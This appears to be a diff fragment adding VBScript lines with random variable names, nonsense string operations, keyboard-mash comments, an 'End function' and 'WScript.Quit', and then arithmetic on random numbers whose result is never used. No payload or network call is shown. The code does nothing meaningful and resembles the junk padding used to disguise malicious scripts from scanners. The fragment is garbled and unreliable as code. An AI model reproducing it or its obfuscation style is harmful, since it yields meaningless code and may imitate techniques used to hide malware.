+GrXnYl = Right("invisidfble", 3)                ' Last N characters
+AfLtPu = Space(12)                            ' Generate 10 spaces
+WsQuGb = StrReverse("ecdsfho")
+OtZwRy = Int(Rnd() * 100)   
+'Caldidfdssgtephus abuser protei totemdite73
+'Loansdfsdarking scgouged teugh, jernmaske.
+End function  
+WScript.Quit   
+Dim x, y, z, j
+x = 10
+y = 3
+z = x * y
+Randomize
+Dim arrayData(5)
+For j = 0 To 5
+    arrayData(j) = Int(Rnd * 60) + 20
+Next
+Dim totalValue
+totalValue = 0
+For j = 0 To UBound(arrayData)
+    totalValue = totalValue + arrayData(j)
+Next
+Dim result
+result = totalValue - z
+x = result
+y = x + z
+z = y - x
